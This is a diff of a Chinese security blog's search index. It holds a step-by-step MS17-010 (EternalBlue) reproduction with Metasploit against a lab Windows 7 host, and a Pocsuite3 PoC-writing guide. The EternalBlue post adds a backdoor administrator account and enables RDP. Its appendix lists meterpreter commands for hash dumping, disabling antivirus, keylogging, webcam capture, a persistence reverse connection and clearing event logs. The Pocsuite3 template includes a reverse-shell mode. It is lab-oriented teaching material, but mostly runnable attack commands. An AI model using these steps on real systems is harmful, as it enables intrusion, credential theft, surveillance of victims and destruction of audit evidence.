+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" alt="image-20210809161826717" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" class="lozad post-image"></p>
+<p>b、成功连接至靶机</p>
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" alt="image-20210809161839547" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" class="lozad post-image"></p>
+<p>至此，本次利用结束。后文附上meterpreter的其他指令，不做演示。</p>
+<p>附录</p>
+<pre class="highlight"><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br><span class="line">getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run                          #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389            #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line"></span><br><span class="line">clearev                       							#清除日志</span><br><span class="line"></span><br><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>MS17-010</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MSSQL注入</title>
     <url>/article/MSSQL%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>端口：1433</p>
@@ -2370,66 +2430,6 @@
       </categories>
       <tags>
         <tag>MSSQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MS17-010漏洞复现</title>
-    <url>/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h1><p>MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
-<h1 id="二、探测"><a href="#二、探测" class="headerlink" title="二、探测"></a>二、探测</h1><p>靶机：win7 x64 sp1 IP：192.168.66.98<br>攻击机：kali 2020.4 IP：192.168.66.138</p>
-<h2 id="1、通过nmap扫描目标机器，发现139、445端口"><a href="#1、通过nmap扫描目标机器，发现139、445端口" class="headerlink" title="1、通过nmap扫描目标机器，发现139、445端口"></a>1、通过nmap扫描目标机器，发现139、445端口</h2><pre class="highlight"><span class="line">nmap -V -T4 192.168.66.98   </span><br><span class="line">#T4设置扫描速度，越高越快（1-5）</span><br><span class="line">#-V显示详情</span><br></pre>
-
-<p>结果：</p>
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" alt="image-20210809161636575" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" class="lozad post-image"></p>
-<h2 id="2、使用msf探测是否存在MS17-010漏洞"><a href="#2、使用msf探测是否存在MS17-010漏洞" class="headerlink" title="2、使用msf探测是否存在MS17-010漏洞"></a>2、使用msf探测是否存在MS17-010漏洞</h2><p>a、寻找MS17-010模块</p>
-<pre class="highlight"><span class="line">search MS17-010</span><br></pre>
-
-<p>发现2个探测模块和4个利用模块</p>
-<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" alt="image-20210809161651064" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" class="lozad post-image"></p>
-<h2 id="3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测"><a href="#3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测" class="headerlink" title="3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测"></a>3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测</h2><pre class="highlight"><span class="line">use auxiliary/scanner/smb/smb_ms17_010   	#调用探测模块</span><br><span class="line">show options                 				#显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98          			#设置目标IP</span><br><span class="line">run                     					#运行探测程序</span><br></pre>
-
-<p>探测出存在MS17-010漏洞</p>
-<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" alt="image-20210809161701790" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" class="lozad post-image"></p>
-<h1 id="三、利用"><a href="#三、利用" class="headerlink" title="三、利用"></a>三、利用</h1><h2 id="1、使用攻击模块对靶机发起攻击"><a href="#1、使用攻击模块对靶机发起攻击" class="headerlink" title="1、使用攻击模块对靶机发起攻击"></a>1、使用攻击模块对靶机发起攻击</h2><pre class="highlight"><span class="line">use exploit/windows/smb/ms17_010_eternalblue    #调用攻击模块</span><br><span class="line">show options                                    #显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98                        #设置目标IP</span><br><span class="line">run                                             #运行探测程序</span><br></pre>
-
-<p>攻击成功，进入后渗透攻击阶段</p>
-<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" alt="image-20210809161712134" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" class="lozad post-image"></p>
-<h2 id="2、靶机信息收集"><a href="#2、靶机信息收集" class="headerlink" title="2、靶机信息收集"></a>2、靶机信息收集</h2><p>a、查看目标主机详细信息</p>
-<pre class="highlight"><span class="line">sysinfo</span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" alt="image-20210809161720244" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" class="lozad post-image"></p>
-<p>b、查看当前获取的权限</p>
-<pre class="highlight"><span class="line">getuid</span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" alt="image-20210809161730216" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" class="lozad post-image"></p>
-<p>system权限，无需提权</p>
-<h2 id="3、开启远程桌面"><a href="#3、开启远程桌面" class="headerlink" title="3、开启远程桌面"></a>3、开启远程桌面</h2><pre class="highlight"><span class="line">run getgui -e</span><br></pre>
-
-<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" alt="image-20210809161744651" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" class="lozad post-image"></p>
-<p>成功开启远程桌面</p>
-<h2 id="4、切换到cmd命令行模式"><a href="#4、切换到cmd命令行模式" class="headerlink" title="4、切换到cmd命令行模式"></a>4、切换到cmd命令行模式</h2><pre class="highlight"><span class="line">shell</span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" alt="image-20210809161756295" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" class="lozad post-image"></p>
-<h2 id="5、添加用户"><a href="#5、添加用户" class="headerlink" title="5、添加用户"></a>5、添加用户</h2><pre class="highlight"><span class="line">net user  </span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" alt="image-20210809161805432" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">net user hacker hacker.123 /add        #添加用户、密码</span><br><span class="line"></span><br><span class="line">net localgroup administrators hacker /add  #提权至管理员组</span><br><span class="line"></span><br><span class="line">net localgroup administrators        #查看管理员组成员</span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" alt="image-20210809161814628" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" class="lozad post-image"></p>
-<p>提权成功</p>
-<h2 id="6、开启远程桌面连接"><a href="#6、开启远程桌面连接" class="headerlink" title="6、开启远程桌面连接"></a>6、开启远程桌面连接</h2><p>a、win+r，输入mstsc调出远程桌面，输入账号密码进行远程桌面连接</p>
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" alt="image-20210809161826717" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" class="lozad post-image"></p>
-<p>b、成功连接至靶机</p>
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" alt="image-20210809161839547" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" class="lozad post-image"></p>
-<p>至此，本次利用结束。后文附上meterpreter的其他指令，不做演示。</p>
-<p>附录</p>
-<pre class="highlight"><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br><span class="line">getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run                          #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389            #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line"></span><br><span class="line">clearev                       							#清除日志</span><br><span class="line"></span><br><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>MS17-010</tag>
       </tags>
   </entry>
   <entry>
@@ -2962,6 +2962,23 @@
 <tr>
 <td align="left">更改数据库连接方式</td>
 <td align="left">POD连接数据库将变量转换成字符串，再写入数据库，无法拼接</td>
+</tr>
+</tbody></table>
+<p>文件读写</p>
+<table>
+<thead>
+<tr>
+<th>读写</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>读文件</td>
+<td>load_file</td>
+</tr>
+<tr>
+<td>写文件</td>
+<td>into  outfile  多行写入，使用单引号，自动添加换行  <br>into  dumpfile  单行写入，不转义</td>
 </tr>
 </tbody></table>
 ]]></content>
@@ -3541,6 +3558,352 @@
       </categories>
       <tags>
         <tag>Oracle</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pocsuite3使用</title>
+    <url>/article/Pocsuite3%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h1><pre class="highlight"><span class="line">漏洞应用名_版本号_漏洞类型名称 </span><br></pre>
+
+<p>（所有字母均为小写,所有的符号改成_）</p>
+<p>例：</p>
+<pre class="highlight"><span class="line">88979_cmseasy_5_5_sql_injection.py</span><br></pre>
+
+<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><pre class="highlight"><span class="line">#导入所写PoC所需要类/文件，尽量不要使用第三方模块。</span><br><span class="line">#迫不得已使用第三方模块有其依赖规则，后面给出。</span><br><span class="line">from pocsuite3.api import Output,POCBase,register_poc,requests</span><br><span class="line"></span><br><span class="line">#PoC实现类，继承POCBase</span><br><span class="line">class DemoPoc(POCBase):</span><br><span class="line">	#PoC信息字段，需要完整填写全部下列信息</span><br><span class="line">	vulID = &#x27;1000&#x27;  					# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span><br><span class="line">    version = &#x27;1&#x27; 						# 默认为1</span><br><span class="line">    author = &#x27;chen&#x27; 					# PoC作者的大名</span><br><span class="line">    vulDate = &#x27;2014-10-16&#x27; 				# 漏洞公开的时间,不知道就写今天</span><br><span class="line">    createDate = &#x27;2014-10-16&#x27;			# 编写PoC的日期</span><br><span class="line">    updateDate = &#x27;2014-10-16&#x27;			# PoC更新的时间,默认和编写时间一样</span><br><span class="line">    references = [&#x27;https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html&#x27;]</span><br><span class="line">    									# 漏洞地址来源,0day不用写</span><br><span class="line">    name = &#x27;Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC&#x27;			# PoC名称</span><br><span class="line">    appPowerLink = &#x27;https://www.drupal.org/&#x27;			# 漏洞厂商主页地址</span><br><span class="line">    appName = &#x27;Drupal&#x27;									# 漏洞应用名称</span><br><span class="line">    appVersion = &#x27;7.x&#x27;									# 漏洞影响版本</span><br><span class="line">    vulType = &#x27;SQL Injection&#x27;							# 漏洞类型,类型参考见 漏洞类型规范表</span><br><span class="line">    desc = &#x27;&#x27;&#x27;</span><br><span class="line">    	漏洞简要描述</span><br><span class="line">    &#x27;&#x27;&#x27; </span><br><span class="line">    samples = []										# 测试样列,就是用 PoC 测试成功的网站</span><br><span class="line">    install_requires = [] 	# PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span><br><span class="line">    #第三方插件需再此处注明</span><br><span class="line">   	# 整个字段的值为list，每个项为一个依赖模块</span><br><span class="line">   	# install_requires =[str_item_,str_item,…] </span><br><span class="line">   	# 如果遇到安装时模块名与调用时的不一致情况，用:分割开</span><br><span class="line">   	# 例如常见的加密算法库pycryptodome,但是调用是以from Crypto.Cipher import AES,此时就需要如下填写</span><br><span class="line">	# install_requires = [&#x27;pycryptodome:Crypto&#x27;]</span><br><span class="line">   	pocDesc = &#x27;&#x27;&#x27; </span><br><span class="line">   		poc的用法描述 </span><br><span class="line">   	&#x27;&#x27;&#x27;</span><br><span class="line">   	</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> 	#编写验证模式</span><br><span class="line">	def _verify(self):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        # 验证代码</span><br><span class="line">        if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">     </span><br><span class="line">    #编写攻击模式</span><br><span class="line">    #若没有攻击模式，直接写return self._verify()即可</span><br><span class="line">    def _attack(self):</span><br><span class="line">    	output = Output(self)</span><br><span class="line">    	result = &#123;&#125;</span><br><span class="line">    	# 攻击代码</span><br><span class="line">    	if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    #编写shell模式</span><br><span class="line">    def _shell(self):</span><br><span class="line">    	cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())</span><br><span class="line">    	# 攻击代码 execute cmd</span><br><span class="line">    </span><br><span class="line">    #自定义输出函数，调用框架输出的实例Output</span><br><span class="line">	def parse_output(self,result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line">register_poc(DemoPoc)</span><br></pre>
+
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><pre class="highlight"><span class="line"># 使用test.py这个PoC去检测http://test.com这个url</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify </span><br><span class="line"></span><br><span class="line"># shell 反弹模式</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify --shell </span><br><span class="line"></span><br><span class="line"># pocsuite3中自带的ecshop poc中实现了自定义命令`command`,可以从外部参数传递</span><br><span class="line">pocsuite -u http://test.com -r ecshop_rce.py --attack --command &quot;whoami&quot; </span><br><span class="line"></span><br><span class="line">#使用test.py这个PoC去检测url.txt文件里所有的url</span><br><span class="line">pocsuite -f url.txt -r test.py --verify </span><br></pre>
+
+<h1 id="Result结果参数说明"><a href="#Result结果参数说明" class="headerlink" title="Result结果参数说明"></a>Result结果参数说明</h1><pre class="highlight"><span class="line">result：[</span><br><span class="line">    &#123;  name: &#x27;DBInfo&#x27;，        value：&#x27;数据库内容&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value：&#x27;管理员密码&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Salt&#x27;，          value: &#x27;加密盐值&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;用户ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Groupid&#x27;，       value: &#x27;用户组ID&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;ShellInfo&#x27;，     value: &#x27;Webshell信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;Webshell地址&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;Webshell内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;FileInfo&#x27;，      value: &#x27;文件信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Filename&#x27;，      value: &#x27;文件名称&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;文件内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;XSSInfo&#x27;，       value: &#x27;跨站脚本信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Payload&#x27;，       value: &#x27;验证Payload&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;AdminInfo&#x27;，     value: &#x27;管理员信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;管理员ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;管理员密码&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;Database&#x27;，      value：&#x27;数据库信息&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Hostname&#x27;，      value: &#x27;数据库主机名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value：&#x27;数据库用户名&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;数据库密码&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;DBname&#x27;，        value: &#x27;数据库名&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;VerifyInfo&#x27;，    value: &#x27;验证信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Target&#x27;，        value: &#x27;验证host:port&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Postdata&#x27;，      value: &#x27;验证POST数据&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Path&#x27;，          value: &#x27;网站绝对路径&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;SiteAttr&#x27;，      value: &#x27;网站服务器信息&#x27;&#125;,</span><br><span class="line">    &#123;  name: &#x27;Process&#x27;，       value: &#x27;服务器进程&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    ]</span><br></pre>
+
+<h1 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h1><table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">from pocsuite3.api import logger</td>
+<td align="left">日志记录，比如logger.log(info)</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import requests</td>
+<td align="left">请求类，用法同 requests</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import Seebug</td>
+<td align="left">Seebug api 调用</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import ZoomEye</td>
+<td align="left">ZoomEye api 调用</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import CEye</td>
+<td align="left">Ceye api 调用</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import crawl</td>
+<td align="left">简单爬虫功能</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import PHTTPServer</td>
+<td align="left">Http服务功能</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import REVERSE_PAYLOAD</td>
+<td align="left">反向连接shell payload</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import get_results</td>
+<td align="left">获取结果</td>
+</tr>
+</tbody></table>
+<h1 id="漏洞类型规范"><a href="#漏洞类型规范" class="headerlink" title="漏洞类型规范"></a>漏洞类型规范</h1><table>
+<thead>
+<tr>
+<th align="left">英文名称</th>
+<th align="left">中文名称</th>
+<th align="left">缩写</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Cross Site Scripting</td>
+<td align="left">跨站脚本</td>
+<td align="left">xss</td>
+</tr>
+<tr>
+<td align="left">Cross Site Request Forgery</td>
+<td align="left">跨站请求伪造</td>
+<td align="left">csrf</td>
+</tr>
+<tr>
+<td align="left">SQL Injection</td>
+<td align="left">Sql注入</td>
+<td align="left">sql-inj</td>
+</tr>
+<tr>
+<td align="left">LDAP Injection</td>
+<td align="left">ldap注入</td>
+<td align="left">ldap-inj</td>
+</tr>
+<tr>
+<td align="left">Mail Command Injection</td>
+<td align="left">邮件命令注入</td>
+<td align="left">smtp-inj</td>
+</tr>
